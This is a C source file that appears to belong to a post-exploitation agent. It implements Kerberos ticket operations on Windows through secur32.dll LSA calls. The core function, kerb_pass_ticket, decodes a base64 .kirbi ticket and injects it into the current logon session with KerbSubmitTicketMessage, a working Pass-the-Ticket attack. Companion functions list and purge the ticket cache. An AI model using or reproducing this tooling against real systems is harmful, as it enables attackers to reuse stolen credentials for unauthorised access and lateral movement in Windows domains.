/*
 * kerberos.c — Kerberos ticket operations via secur32.dll LSA APIs.
 *
 * Operations:
 *   kerb_list_tickets() — run klist, or fall back to KerbQueryTicketCacheExMessage
 *   kerb_pass_ticket()  — KerbSubmitTicketMessage (Pass-the-Ticket)
 *   kerb_purge()        — KerbPurgeTicketCacheMessage
 *
 * All LSA structures are defined inline to avoid ntsecapi.h/subauth.h
 * quirks in the mingw cross-compiler. secur32.dll is loaded at runtime
 * via LoadLibrary/GetProcAddress, so no import library is strictly required.
 *
 * Caller must free() every returned string.
 */
#include "kerberos.h"
#include "b64.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ── LSA type definitions (avoids ntsecapi.h / subauth.h issues) ──────────── */

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* LSA_STRING / KERB_LSA_STRING (ANSI, matches Win32 layout) */
typedef struct {
    USHORT  Length;
    USHORT  MaximumLength;
    CHAR   *Buffer;
} KERB_LSA_STRING;

/* Function pointer types for the four LSA functions we need */
typedef NTSTATUS (*PFN_LsaConnectUntrusted)(HANDLE *LsaHandle);

typedef NTSTATUS (*PFN_LsaLookupAuthenticationPackage)(
    HANDLE  LsaHandle,
    KERB_LSA_STRING *PackageName,
    ULONG  *AuthenticationPackage);

typedef NTSTATUS (*PFN_LsaCallAuthenticationPackage)(
    HANDLE   LsaHandle,
    ULONG    AuthenticationPackage,
    PVOID    ProtocolSubmitBuffer,
    ULONG    SubmitBufferLength,
    PVOID   *ProtocolReturnBuffer,
    ULONG   *ReturnBufferLength,
    NTSTATUS *ProtocolStatus);

typedef NTSTATUS (*PFN_LsaFreeReturnBuffer)(PVOID Buffer);

/* Bundle of resolved function pointers */
typedef struct {
    PFN_LsaConnectUntrusted             Connect;
    PFN_LsaLookupAuthenticationPackage  Lookup;
    PFN_LsaCallAuthenticationPackage    Call;
    PFN_LsaFreeReturnBuffer             Free;
} LsaFns;

/* ── Internal: load secur32.dll and resolve the four functions ────────────── */

static int load_lsa_fns(LsaFns *f) {
    /* LoadLibrary increments refcount; we intentionally never FreeLibrary
     * so the module stays loaded for the lifetime of the process. */
    HMODULE hMod = LoadLibraryA("secur32.dll");
    if (!hMod) return 0;

    f->Connect = (PFN_LsaConnectUntrusted)
        GetProcAddress(hMod, "LsaConnectUntrusted");
    f->Lookup  = (PFN_LsaLookupAuthenticationPackage)
        GetProcAddress(hMod, "LsaLookupAuthenticationPackage");
    f->Call    = (PFN_LsaCallAuthenticationPackage)
        GetProcAddress(hMod, "LsaCallAuthenticationPackage");
    f->Free    = (PFN_LsaFreeReturnBuffer)
        GetProcAddress(hMod, "LsaFreeReturnBuffer");

    return (f->Connect && f->Lookup && f->Call && f->Free) ? 1 : 0;
}

/* ── Internal: open an LSA handle and resolve the Kerberos package ID ─────── */

static int kerb_open(LsaFns *fns, HANDLE *handle_out, ULONG *pkg_id_out,
                     char *errbuf, size_t errsz) {
    HANDLE   handle = NULL;
    NTSTATUS st     = fns->Connect(&handle);
    if (!NT_SUCCESS(st)) {
        snprintf(errbuf, errsz,
                 "LsaConnectUntrusted NTSTATUS=0x%08lX", (unsigned long)(ULONG)st);
        return 0;
    }

    char name_buf[] = "Kerberos";
    KERB_LSA_STRING pkg_name;
    pkg_name.Buffer        = name_buf;
    pkg_name.Length        = (USHORT)strlen(name_buf);
    pkg_name.MaximumLength = (USHORT)(strlen(name_buf) + 1);

    ULONG pkg_id = 0;
    st = fns->Lookup(handle, &pkg_name, &pkg_id);
    if (!NT_SUCCESS(st)) {
        snprintf(errbuf, errsz,
                 "LsaLookupAuthenticationPackage NTSTATUS=0x%08lX", (unsigned long)(ULONG)st);
        return 0;
    }

    *handle_out = handle;
    *pkg_id_out = pkg_id;
    return 1;
}

/* ── kerb_list_tickets ────────────────────────────────────────────────────── */

char* kerb_list_tickets(void) {
    /* Primary path: capture klist output */
    FILE *f = _popen("cmd.exe /s /c \"klist 2>&1\"", "r");
    if (f) {
        size_t cap = 4096, len = 0;
        char *buf = (char*)malloc(cap);
        if (buf) {
            int c;
            while ((c = fgetc(f)) != EOF) {
                if (len + 2 >= cap) {
                    cap *= 2;
                    char *nb = (char*)realloc(buf, cap);
                    if (!nb) break;
                    buf = nb;
                }
                buf[len++] = (char)c;
            }
            buf[len] = '\0';
        }
        _pclose(f);
        if (buf && len > 0) return buf;
        free(buf);
    }

    /* Fallback: LSA KerbQueryTicketCacheExMessage (type=14)
     * to at least report how many tickets are cached.
     *
     * Request layout (12 bytes):
     *   [0..3]  MessageType = 14 (KerbQueryTicketCacheExMessage)
     *   [4..7]  LogonId.LowPart  = 0 (current session)
     *   [8..11] LogonId.HighPart = 0
     */
    LsaFns fns;
    memset(&fns, 0, sizeof(fns));
    if (!load_lsa_fns(&fns))
        return strdup("[error: secur32.dll unavailable]");

    char errbuf[256] = {0};
    HANDLE handle  = NULL;
    ULONG  pkg_id  = 0;
    if (!kerb_open(&fns, &handle, &pkg_id, errbuf, sizeof(errbuf))) {
        char *e = (char*)malloc(320);
        snprintf(e, 320, "[error: %s]", errbuf);
        return e;
    }

    BYTE req[12] = {0};
    *(ULONG*)req = 14; /* KerbQueryTicketCacheExMessage */

    PVOID    resp     = NULL;
    ULONG    resp_len = 0;
    NTSTATUS prot     = 0;
    fns.Call(handle, pkg_id, req, (ULONG)sizeof(req), &resp, &resp_len, &prot);

    char *out;
    if (resp) {
        ULONG count = *(ULONG*)((BYTE*)resp + 4);
        fns.Free(resp);
        out = (char*)malloc(128);
        snprintf(out, 128,
                 "Kerberos ticket cache: %lu ticket(s) (klist unavailable)",
                 (unsigned long)count);
    } else {
        out = strdup("[error: no LSA ticket-cache response]");
    }
    return out;
}

/* ── kerb_pass_ticket ─────────────────────────────────────────────────────── */

char* kerb_pass_ticket(const char *b64_ticket) {
    /* Decode the base64-encoded .kirbi blob */
    size_t   ticket_len = 0;
    uint8_t *ticket     = b64_decode(b64_ticket, &ticket_len);
    if (!ticket || ticket_len == 0) {
        free(ticket);
        return strdup("[error: base64 decode failed or empty ticket]");
    }

    LsaFns fns;
    memset(&fns, 0, sizeof(fns));
    if (!load_lsa_fns(&fns)) {
        free(ticket);
        return strdup("[error: secur32.dll unavailable]");
    }

    char errbuf[256] = {0};
    HANDLE handle  = NULL;
    ULONG  pkg_id  = 0;
    if (!kerb_open(&fns, &handle, &pkg_id, errbuf, sizeof(errbuf))) {
        free(ticket);
        char *e = (char*)malloc(320);
        snprintf(e, 320, "[error: %s]", errbuf);
        return e;
    }

    /*
     * KERB_SUBMIT_TKT_REQUEST layout (x64, manual byte offsets):
     *
     * Offset  Size  Field
     *    0      4   MessageType  = 21 (KerbSubmitTicketMessage)
     *    4      4   LogonId.LowPart  = 0 (current session)
     *    8      4   LogonId.HighPart = 0
     *   12      4   Flags = 0
     *   16      4   Key32.KeyType = 0
     *   20      4   Key32.Length  = 0
     *   24      4   Key32.Offset  = 0
     *   28      4   KerbCredSize  = len(ticket)
     *   32      4   KerbCredOffset = 36 (== header size)
     *   36    ...   <raw .kirbi bytes>
     */
    const ULONG HDR      = 36;
    const ULONG req_size = HDR + (ULONG)ticket_len;

    BYTE *req = (BYTE*)calloc(1, req_size);
    if (!req) { free(ticket); return strdup("[oom]"); }

    *(ULONG*)(req +  0) = 21;                  /* KerbSubmitTicketMessage */
    *(ULONG*)(req + 28) = (ULONG)ticket_len;   /* KerbCredSize */
    *(ULONG*)(req + 32) = HDR;                 /* KerbCredOffset */
    memcpy(req + HDR, ticket, ticket_len);
    free(ticket);

    PVOID    resp     = NULL;
    ULONG    resp_len = 0;
    NTSTATUS prot     = 0;
    NTSTATUS st = fns.Call(handle, pkg_id, req, req_size, &resp, &resp_len, &prot);
    free(req);
    if (resp) fns.Free(resp);

    if (!NT_SUCCESS(st) || !NT_SUCCESS(prot)) {
        char *e = (char*)malloc(128);
        snprintf(e, 128,
                 "[error: PTT failed NTSTATUS=0x%08lX protocolStatus=0x%08lX]",
                 (unsigned long)(ULONG)st, (unsigned long)(ULONG)prot);
        return e;
    }
    return strdup("[+] ticket submitted successfully");
}

/* ── kerb_purge ───────────────────────────────────────────────────────────── */

char* kerb_purge(void) {
    LsaFns fns;
    memset(&fns, 0, sizeof(fns));
    if (!load_lsa_fns(&fns))
        return strdup("[error: secur32.dll unavailable]");

    char errbuf[256] = {0};
    HANDLE handle  = NULL;
    ULONG  pkg_id  = 0;
    if (!kerb_open(&fns, &handle, &pkg_id, errbuf, sizeof(errbuf))) {
        char *e = (char*)malloc(320);
        snprintf(e, 320, "[error: %s]", errbuf);
        return e;
    }

    /*
     * KERB_PURGE_TKT_CACHE_REQUEST layout (x64, manual byte offsets):
     *
     * Offset  Size  Field
     *    0      4   MessageType = 6 (KerbPurgeTicketCacheMessage)
     *    4      4   LogonId.LowPart  = 0 (current session)
     *    8      4   LogonId.HighPart = 0
     *   12      4   <padding for UNICODE_STRING 8-byte pointer alignment>
     *   16      2   ServerName.Length   = 0 (all servers)
     *   18      2   ServerName.MaxLen   = 0
     *   20      4   <padding for Buffer pointer>
     *   24      8   ServerName.Buffer   = NULL
     *   32      2   RealmName.Length    = 0 (all realms)
     *   34      2   RealmName.MaxLen    = 0
     *   36      4   <padding>
     *   40      8   RealmName.Buffer    = NULL
     *   -- total 48 bytes --
     */
    BYTE req[48] = {0};
    *(ULONG*)req = 6; /* KerbPurgeTicketCacheMessage */
    /* All LogonId, ServerName, RealmName fields remain zero → current session, all */

    PVOID    resp     = NULL;
    ULONG    resp_len = 0;
    NTSTATUS prot     = 0;
    fns.Call(handle, pkg_id, req, (ULONG)sizeof(req), &resp, &resp_len, &prot);
    if (resp) fns.Free(resp);

    if (!NT_SUCCESS(prot)) {
        char *e = (char*)malloc(128);
        snprintf(e, 128,
                 "[error: purge NTSTATUS=0x%08lX]", (unsigned long)(ULONG)prot);
        return e;
    }
    return strdup("[+] Kerberos ticket cache purged");
}
